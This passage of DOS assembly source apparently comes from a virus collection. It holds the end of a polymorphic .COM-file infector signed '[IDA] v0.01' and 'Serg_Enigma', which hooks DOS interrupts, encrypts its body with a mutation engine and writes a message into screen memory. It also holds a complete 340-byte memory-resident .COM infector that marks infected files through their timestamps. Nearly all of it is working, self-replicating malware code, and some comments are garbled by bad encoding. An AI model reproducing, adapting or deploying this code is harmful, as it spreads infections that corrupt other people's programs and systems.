z1:     Cmp     Al,Ds:[Di]
        Je      lng_ext
        Inc     Di
        Loop    z1
        Jmp     Exit
lng_ext:
        Sub     Di,4
        Mov     Al,'.'
        Cmp     Al,Ds:[Di]
        je      Test_ext
        Jmp     Exit
Test_ext:
        Mov     Si,Di
        Sub     Si,6
        Mov     Ax,Ds:[Si]
        And     Ax,0dfdfh
        Cmp     Ax,'BI'
        Je      Ex
        Inc     Di
        Mov     Al,Ds:[Di]
        And     Al,0dfh
        Cmp     Al,'C'
        Jne     Ex
        Inc     Di
        Mov     Al,Ds:[Di]
        And     Al,0dfh
        Cmp     Al,'O'
        Jne     Ex
        Inc     Di
        Mov     Al,Ds:[Di]
        And     Al,0dfh
        Cmp     Al,'M'
        Je      Infect
Ex:     Jmp     Exit

infect:
        Call    set_24
        Mov     Ax,4300h
        Call    Intr21
        Xor     Ch,Ch
        And     Cx,0fffeh
        Mov     Ax,4301h
        Call    Intr21
        Mov     Ax,3d02h
        Call    Intr21
        Jc      late
        Xchg    Ax,Bx
        Mov     Ax,4200h
        Call    move
        Push    Cs
        Pop     Ds
        Mov     Ah,3fh
        Mov     Cx,3h
        Mov     Dx,offset Buf_j - 100h - 203d
        Call    Intr21
        Cmp     word ptr buf_j-100h-203d,'ZM'
        Jz      Close
        Mov     Ax,5700h
        Call    Intr21
        Mov     word ptr time-100h-203d,Cx
        Mov     word ptr date-100h-203d,Dx
        Mov     Ax,4202h
        Mov     Dx,-02h
        Mov     Cx,0ffffh
        Call    Intr21
        Mov     Ah,3fh
        Mov     Cx,02h
        Mov     Dx,offset buffer-100h-203d
        Call    Intr21
        Mov     Si,Dx
        Mov     Dx,word ptr ID-100h-203d
        Cmp     word ptr [Si],Dx
        Je      Close
        Mov     Ax,4200h
        Call    move
        Mov     Ax,4202h
        Call    move
        Cmp     Ax,62000d
        ja      close
        Cmp     Ax,100h
        jb      close
        Mov     word ptr _size-100h-203d,Ax
        Sub     Ax,03h
        Mov     word ptr New_j-100h-202d,Ax


;################################## [IDA] v_0.01 ##############################
        Push    Bx
        Call    Poly
        Pop     Bx              ;                 #############################
        Cmp     Ax,0ffffh
        je      Close

        Mov     Ah,40h          ;                 #
        Xor     Dx,Dx           ;                 #
        Mov     Cx,D_last - 100h-203 ;            #
        Push    Es              ;                 #
        Pop     Ds              ;                 #
        Call    Intr21          ;                 #
;#########################################        #
        Mov     Ah,40h          ;        #        #
        Mov     Dx,100h         ;        #        #
        Mov     Cx,lng          ;        #        #
        Call    Intr21          ;        #        #
;#########################################        #
        Mov     Ah,49h  ;                         #
        Call    intr21  ;                         #
        Push    Cs      ;                         #
        Pop     Ds      ;                         #
;##################################################

        Mov     Ax,4200h
        Call    move
        Mov     Ah,40h
        Mov     Dx,offset New_j-100h-203d
        Mov     Cx,3h
        Call    Intr21
        Mov     Ax,5701h
        Mov     Dx,word ptr cs:date-100h-203d
        Mov     Cx,word ptr cs:time-100h-203d
        Call    Intr21
Close:
        Mov     Ah,3eh
        Call    Intr21
Late:   Push    Cs
        Pop     Ds
        Mov     Dx,word ptr Old_24 - 100h - 203d
        Push    word ptr Old_24a - 100h - 203d
        Pop     Ds
        Mov     Ax,2524h
        Call    Intr21
Exit:   Pop     Di
        Pop     Si
        Pop     Es
        Pop     Ds
        Pop     Dx
        Pop     Cx
        Pop     Bx
        Pop     Ax
        Cmp     Ax,0deadh
        Je      Ok
        Popf

Old_21:
        Jmp     dword ptr Cs:s1-100h-203d
;==============================================================
set_24: Push    Ds
        Push    Dx
        Push    Bx
        Push    Es
        Mov     Ax,3524h
        Call    Intr21
        Push    Cs
        Pop     Ds
        Mov     word ptr old_24 - 100h - 203d,Bx
        Mov     word ptr old_24a - 100h - 203d,Es
        Mov     Ah,25h
        Mov     Dx,offset New_24 - 100h - 203d
        Call    Intr21
        Pop     Es
        Pop     Bx
        Pop     Dx
        Pop     Ds
        Ret

New_24: Mov     Al,3
        Iret

ok:     Mov     Di,1996h
        Popf
        Iret

Buf_j   db      0cdh,20h,90h
New_j   db      0e9h,00h,00h

date    dw      ?
time    dw      ?

move:   Xor     Cx,Cx
        Cwd
        Call    Intr21
        ret
intr21:
        Pushf
        db      09ah
s1      dw      ?
s2      dw      ?
        Ret

int_1c: push    ds
        push    es
        push    ax
        push    dx
        push    cx
        push    di
        push    si
        cmp     byte ptr cs:data_3e,0
        jae     loc_1
        jmp     short loc_8

Mes     db      'IVeronika !'
mes_lng =       $-offset Mes
data_2e db      'VERA'
data_3e db      14h

loc_1:  mov     byte ptr cs:data_3e-100h-203d,14h
        mov     ax,0B800h
        mov     es,ax
        mov     di,0fa0h
loc_2:  sub     di,8
        clc
loc_3:  mov     al,es:[di]
        and     al,0DFh
        cmp     al,56h  ; 'V'
        je      loc_5
loc_4:  dec     di
        dec     di
        cmp     di,1388h
        jb      loc_3
        jmp     short loc_9
loc_5:  mov     cx,4
        mov     si,offset data_2e - 100h - 203d
        push    cs
        pop     ds
        cld
loop_6: mov     al,es:[di]
        and     al,0DFh
        cmp     [si],al
        jne     loc_2
        inc     di
        inc     di
        inc     si
        loop    loop_6
        mov     cx,mes_lng
        sub     di,8
        mov     si,offset Mes - 100h - 203d
loop_7: movsb
        inc     di
        loop    loop_7
loc_8:  dec     byte ptr cs:data_3e -100h-203d
loc_9:  pop     si
        pop     di
        pop     cx
        pop     dx
        pop     ax
        pop     es
        pop     ds
Old_1c:
        db      0eah
hm      dw      ?
lm      dw      ?

_size   dw      ?

Old_24  dw      ?
Old_24a dw      ?

;########################## [IDA]'s Subprograms ###############################
Poly:           Mov     Ah,48h                  ;
                Mov     Bx,mem+80h                    ;
                Call    intr21                    ;
                jnc     You
                Mov     Ax,0ffffh
                Ret
You:            Mov     Es,Ax                     ;
                Mov     word ptr new_seg-100h-203d,Ax ;
                Mov     word ptr D_lng-100h-203d,0    ;
                Mov     word ptr D0lng-100h-203d,0    ;
Big:            Call    Get_rnd                 ;
                Mov     Ax,000fh                ;
                Call    Get_off                 ;
                Or      Di,Di                   ;
                Jz      Big                     ;
                Mov     Cx,Di                   ;
                Xor     Di,Di                   ;
Gen_com:        Push    Di                      ;
                Call    Get_rnd                 ;
                Mov     Ax,0025                 ;
                Call    Get_off                 ;
                Lea     Si,[Di]+one_b_op-100h-203d    ;
                Pop     Di                      ;
                Cld
                LodSb                           ;
                StoSb                           ;
                Loop    Gen_com                 ;
                Mov     word ptr D_lng-100h-203d,Di  ;########################## 1
                Call    Get_rnd                 ;
                Mov     Ax,17                   ;
                Call    Get_off                 ;
                Mov     Ax,7h                   ;
                Mul     Di                      ;
                Push    Es                      ;
                Push    Cs                      ;
                Pop     Es
                Mov     Si,offset log_op - 100h-203d
                Add     Si,Ax
                Mov     word ptr cm_off-100h-203d,Si
                Mov     Di,offset com_buf - 100h-203d
                Cld
                MovSw
                Pop     Es
                Call    Set_op                  ;creating table
                Cmp     byte ptr m2-100h-203d,0
                Je      one_com
                Mov     Di,word ptr D_lng-100h-203d
                Mov     Si,offset m2-100h-203d
                LodSb
                StoSb
                Inc     Di
                Inc     Di
                Call    Gen_Gar
                Add     word ptr D0lng-100h-203d,3
one_com:        Mov     Di,word ptr D_lng-100h-203d
                Add     Di,word ptr D0lng-100h-203d
                Mov     word ptr D_lng1-100h-203d,Di ;######################## 2
                Mov     Si,offset m1-100h-203d
                Cld
                LodSb
                StoSb
                Inc     Di
                Inc     Di
                Call    Gen_Gar
                Mov     Si,offset com_buf-100h-203d
                Cld
                LodSw
                StoSw
                Call    Gen_Gar
                Mov     Si,word ptr cm_off-100h-203d
                Add     Si,5
                Cld
                LodSb
                StoSb
                Call    Gen_Gar
                Mov     word ptr D_lng2-100h-203d,Di ;###################### 3
                Mov     Si,offset _cmp-100h-203d
                Cld
                LodSw
                StoSw
                Inc     Di
                Inc     Di
                Call    Gen_Gar
                Mov     Si,offset Jx1-100h-203d
                Mov     word ptr D_lng4-100h-203d,Di ;###### Jb / Loop ###### 4
                Cld
                LodSw
                StoSw
                Call    Gen_Gar
                Mov     word ptr D_last-100h-203d,Di

                Mov     Di,word ptr D_lng-100h-203d
                Inc     Di
                Call    Get_rnd
                clc
                Mov     word ptr es:[Di],Bx
                Mov     Di,word ptr D_lng1-100h-203d
                Inc     Di
                Mov     word ptr es:[Di],100h

                Mov     Di,word ptr D_lng2-100h-203d ; cmp xx,offset end
                Inc     Di
                Inc     Di
                Mov     word ptr es:[Di],lng+0fdh ; not crypt last 3 byte of ID

                Mov     Di,word ptr D_lng4-100h-203d
                Inc     Di
                Mov     Ax,word ptr D_lng4-100h-203d
                Sub     Ax,word ptr D_lng1-100h-203d
                Mov     Bl,01h
                Sub     Bl,Al
                Mov     byte ptr es:[Di],Bl
                Mov     Cx,lng
                Mov     Si,offset Sc-100h-203d
                Mov     Di,100h
                Rep     MovSb

                Mov     Cx,lng_II-2
                Call    Get_rnd
		Push	Bx
		Mov	Ax,2080h
		Call	Get_off
		Xchg	Ax,Di
		Sub	Bh,Al
                Mov     Di,offset dat-203d
                Mov     word ptr Es:[109h],Bx ;###############   ##############
		Pop	Bx
Drug:           Xor     word ptr Es:[Di],Bx
                Add     Bx,'SE'
                Inc     Di
                Loop    Drug

                Mov     Di,D_last-100h-203d
                Mov     byte ptr Es:[Di],0cbh
                Push    Ds
                Push    Es
                Pop     Ds

                Pushf
                Push    Bp
                db      09ah
                dw      0
new_seg         dw      ?
                Pop     Bp
                Popf

                Pop     Ds
                Mov     Dx,word ptr _size-100h-203d
                Add     Dx,word ptr D_last-100h-203d
                Mov     Di,word ptr D_lng1-100h-203d
                Inc     Di
                Add     Dx,100h
                Mov     word ptr es:[Di],Dx
                Add     Dx,Lng
                Mov     Di,word ptr D_lng2-100h-203d
                Inc     Di
                Inc     Di
                Sub     Dx,3
                Mov     word ptr es:[Di],Dx
                Ret

one_b_op        db      040h                    ; Inc Ax
                db      041h                    ; Inc Cx
                db      042h                    ; inc dx
                db      043h                    ; inc bx*
                db      045h                    ; inc bp
                db      046h                    ; inc si*
                db      047h                    ; inc di*
                db      048h                    ; dec ax
                db      049h                    ; dec cx
                db      04ah                    ; dec dx
                db      04bh                    ; dec bx*
                db      04dh                    ; dec bp
                db      04eh                    ; dec si*
                db      04fh                    ; dec di*
                nop     ;                stc
                nop     ;                clc
                cld
                cbw
                cld
                nop     ;               cmc
                db      090h                    ; Nop
                db      026h                    ;
                db      03Eh                    ;
                db      042h                    ;
                db      02Eh                    ;

log_op  db      0F6h, 14h  ,0feh,0beh,000h,046h,04eh ;0        Not b,[Si]
        db      0F6h, 15h  ,0ffh,0bfh,000h,047h,04fh ;1        Not b,[Di]
        db      0F6h, 17h  ,0fbh,0bbh,000h,043h,04bh ;2        Not b,[Bx]
        db      0F6h, 1Ch  ,0feh,0beh,000h,046h,04eh ;3        Neg b,[Si]
        db      0F6h, 1Dh  ,0ffh,0bfh,000h,047h,04fh ;4        Neg b,[Di]
        db      0F6h, 1Fh  ,0fbh,0bbh,000h,043h,04bh ;5        Neg b,[Bx]

        db      031h, 04h  ,0feh,0beh,0b8h,046h,04eh ;6        Xor w,[Si],Ax
        db      031h, 05h  ,0ffh,0bfh,0b8h,047h,04fh ;7        Xor w,[Di],Ax
        db      031h, 07h  ,0fbh,0bbh,0b8h,043h,04bh ;8        Xor w,[Bx],Ax
        db      031h, 0Ch  ,0feh,0beh,0b9h,046h,04eh ;9        Xor w,[Si],Cx
        db      031h, 0Dh  ,0ffh,0bfh,0b9h,047h,04fh ;10       Xor w,[Di],Cx
        db      031h, 0Fh  ,0fbh,0bbh,0b9h,043h,04bh ;11       Xor w,[Bx],Cx
        db      031h, 14h  ,0feh,0beh,0bah,046h,04eh ;12       Xor w,[Si],Dx
        db      031h, 15h  ,0ffh,0bfh,0bah,047h,04fh ;13       Xor w,[Di],Dx
        db      031h, 17h  ,0fbh,0bbh,0bah,043h,04bh ;14       Xor w,[Bx],Dx
        db      031h, 1Ch  ,0feh,0beh,0bbh,046h,04eh ;15       Xor w,[Si],Bx
        db      031h, 1Dh  ,0ffh,0bfh,0bbh,047h,04fh ;16       Xor w,[Di],Bx
Jx1     db      072h, 00h               ; Jb yy
;Jx2     db      0e2h, 00h               ; Loop yy

copyright       db      0,'[IDA] v0.01',0,'Serg_Enigma',0
;message                db      'à Ì‚Æ •ÈÒ ≠• ¢·Ò... 1997£'
D0lng           dw      0       ;
D_lng           dw      0       ; ë¨•È•≠®• ≠† Mov ??,???? = 1
D_lng1          dw      0       ; ë¨•È•≠®• ≠† Mov ??,???? = 2
D_lng2          dw      0       ; ë¨•È•≠®• ≠† Cmp ??,????
D_last          dw      0       ; ë¨•È•≠®• ≠† ØÆ·´•§≠®© °†©‚ CRYPT'†
D_lng4          dw      ?       ; OFFSET Jb yy
Count           db      ?
_Cmp            db      081h
_c              db      0
m1              db      0
m2              db      0
ni1             db      0
ni2             db      0
;ni3            db      0
;ni4            db      0
Com_buf         dw      ?
Data            dw      ?
Cm_off          dw      ?

Set_op:         Push    Es
                Push    Cs
                Pop     Es
                Push    Di
                Push    Si
                Mov     Si,word ptr cm_off-100h-203d
                Inc     Si
                Inc     Si
                Mov     Di,offset _c-100h-203d
                mov     cx,5
                rep     movsb
                Pop     Si
                Pop     Di
                Pop     Es
                Ret

Gen_gar:        Xchg    Di,Dx
gar:            Call    Get_rnd         ;
                Mov     Ax,000fh
                Call    Get_off
                Or      Di,Di
                Jz      gar
                Mov     Cx,Di
                Mov     word ptr D0lng-100h-203d,Cx  ; Ñ´®≠≠† 2
ag2:            Call    Get_rnd
                Mov     Ax,0025
                Call    Get_off
                Lea     Si,[Di]+one_b_op-100h-203d
                LodSb
                Cmp     Al,byte ptr ni1-100h-203d
                Je      ag2
                Cmp     Al,byte ptr ni2-100h-203d
                Je      ag2
                Mov     Di,Dx
                Cld
                StoSb
                Mov     Dx,Di
                Loop    ag2     ;Gen_com1
                Ret

Get_off:
                Push    Ax                      ; di - result
                Push    Bx
                Push    Cx
                Push    Dx
                Xchg    Dx,Bx
                Xor     Bx,Bx
                Mov     Cx,65535
der:            Mov     Bh,Ah  ;start of space
cyc:            call    ser
                Inc     Bh
                Cmp     Bh,Al  ;end of space
                Jnz     cyc
                Loop    der
                ret

_ok:            Xor     Bl,Bl
                Xchg    Bh,Bl
                Mov     Di,Bx
                Pop Dx
                Pop Cx
                Pop Bx
                Pop Ax
                Cld
                Ret
ser:            Inc Bl
                Cmp Bl,Dl
                Jz fc
                Ret
fc:             Pop Cx
                Jmp _ok

Get_rnd:        Push    Ax              ; bx - random number
                Push    Dx
                Push    Es
                Push    Di
                Push    Cx
                In      Ax,[40h]
                Xchg    Ax,Dx
                Inc     byte ptr Count-100h-203d
                Mov     Ax,0f800h
                Mov     Es,Ax
                Mov     Di,word ptr Data-100h-203d
                Xor     Dx,word ptr Es:[Di]
                Mov     word ptr Data+100h-203d,Dx
                Mov     Cl,byte ptr Count+100h-203d
                Rol     Dx,Cl
                Mov     Bx,Dx
                Pop     Cx
                Pop     Di
                Pop     Es
                Pop     Dx
                Pop     Ax
                Cld
                Ret

;##############################################################################

Buffer  dw      ?
Lng_II  =       $- dat
sc      ENDP
ID      db      ''
Lng     =       $-Sc
mem     =       (Lng/16d)+10
END start
END

ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[RC_1490.ASM]ƒƒƒ
ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[RC_340.ASM]ƒƒƒ
        .MODEL tiny
        .186
        .code
        org 100h
start:
        jmp     sc
        db      200d dup(08h)
sc     PROC
	Call	Go
Go:	Pop	Bp
	Sub	Bp,offset Go
	Mov	Ax,0deadh
	Int	21h
	Cmp	Dx,1996h
	Jz	Rt
        Mov     Ax,4900h
        Int     21h
        Jc      rt
        Mov     Ax,4800h
        Mov     Bx,0FFFFh
        Int     21h
        Sub     Bx,mem
        Jc      rt
	Mov	Cx,Es
	Stc
	Adc	Cx,Bx
	Mov     Ax,4a00h
        Int     21h
	Mov	Bx,mem-1
	Stc
	Sbb	word ptr  Es:[0002h],Bx
	Mov	Es,Cx
        Mov     Ax,4a00h
        Int     21h
	Mov	Ax,Es
	Dec	Ax
	Mov	Ds,Ax
	Mov	word ptr Ds:[0001],8
	Push	Cs
	Pop	Ds
	Push	Es
	Mov	Ax,3521h
	Int	21h
	Mov	word ptr Old_21+1,Bx
	Mov	word ptr Old_21+3,Es
	Lea	Si,Sc+[Bp]
	Xor	Di,Di
	Pop	Es
	Mov	Cx,Lng
	Rep	MovSb
	Mov	Ax,2521h
	Mov	Dx,offset res - 103h - 200d
	Push	Es
	Pop	Ds
	Int	21h
	Jmp	Rt

Res:	Pushf
	Push	Ax
	Push	Bx
	Push	Cx
	Push	Dx
	Push	Ds
	Push	Es
	Cmp	Ax,4b00h
	Jnz	Exit
	Mov	Ax,4300h
	Int	21h
	Xor	Ch,Ch
	And	Cx,0fffeh
	Mov	Ax,4301h
	Int	21h
	Mov	Ax,3d02h
	Int	21h
	Jc	Exit
	Xchg	Ax,Bx
	Mov	Ax,4200h
	Call	move
	Push	Cs
	Pop	Ds
	Mov	Ah,3fh
	Mov	Cx,3h
	Mov	Dx,offset Buf_j - 100h - 203d
	Int	21h
	Cmp	word ptr buf_j-100h-203d,'ZM'
	Jz	Close
	Mov	Ax,5700h
	Int	21h
	Mov	word ptr time-100h-203d,Cx
	Mov	word ptr date-100h-203d,Dx
	And	Cx,1ah
	Cmp	Cx,1ah
	Jz	Close
	Mov	Ax,4200h
	Call	move
	Mov	Ax,4202h
 	Call	move
	Cmp	Ax,62000d
	ja	close
	Cmp	Ax,100h
	jb	close
	Sub	Ax,03h
	Mov	word ptr New_j-100h-202d,Ax
	Mov	Ah,40h
	Xor	Dx,Dx
	Mov	Cx,lng
	Int	21h
	Mov	Ax,4200h
	Call	move
	Mov	Ah,40h
	Mov	Dx,offset New_j-100h-203d
	Mov	Cx,3h
	Int	21h
	Mov	Ax,5701h
	Mov	Dx,word ptr cs:date-100h-203d
	Mov	Cx,word ptr cs:time-100h-203d
	And	Cx,0ff0eh
	or	Cx,1ah
	Int	21h
Close:	Mov	Ah,3eh
	Int	21h
Exit:	Pop	Es
	Pop	Ds
	Pop	Dx
	Pop	Cx
	Pop	Bx
	Pop	Ax
	Cmp	Ax,0deadh
	Jz	Ok
	Popf

Old_21:	
	db	0eah
	dw	0000h,0000h
;==============================================================
ok:	Mov	Dx,1996h
	Popf
	Iret

Buf_j	db	0cdh,20h,90h
New_j	db	0e9h,00h,00h
date	dw	?
time	dw	?

move:	Xor	Cx,Cx
	Cwd
	Int	21h
	ret
;==============================================================
rt:
        Push    Cs
        Pop     Ds
	Push	Cs
	Pop	Es
	Lea	Si,Buf_j+[Bp]
	Mov	Di,100h
	MovSw
	MovSb
        Xor     Ax,Ax
        Xor     Cx,Cx
        Cwd
        Mov     Bx,Dx
	Push	100h
        Ret
sc      ENDP
	db	'SERG_v2'
Lng	=	$-Sc
mem	=	(Lng/16d)+2
END start
END

ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[RC_340.ASM]ƒƒƒ
